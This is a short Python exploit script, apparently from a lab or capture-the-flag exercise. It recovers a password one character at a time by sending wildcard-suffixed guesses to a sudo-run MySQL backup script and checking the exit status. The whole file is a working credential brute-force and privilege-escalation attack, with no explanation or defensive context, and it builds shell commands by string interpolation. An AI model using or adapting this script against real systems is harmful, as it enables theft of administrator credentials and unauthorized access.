#!/usr/bin/env python3

from os import system

CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

if __name__ == '__main__':
    pswd = ['*']
    i = 0

    print(system('echo "*" | sudo /opt/scripts/mysql-backup.sh'))
    while True:
        pswd.append('*')
        for c in CHARS:
            pswd[i] = c
            result = ''.join(pswd)
            if not system(f'echo "{result}" | sudo /opt/scripts/mysql-backup.sh'):
                break
        else:
            break
        i += 1
    print(result[:-2])
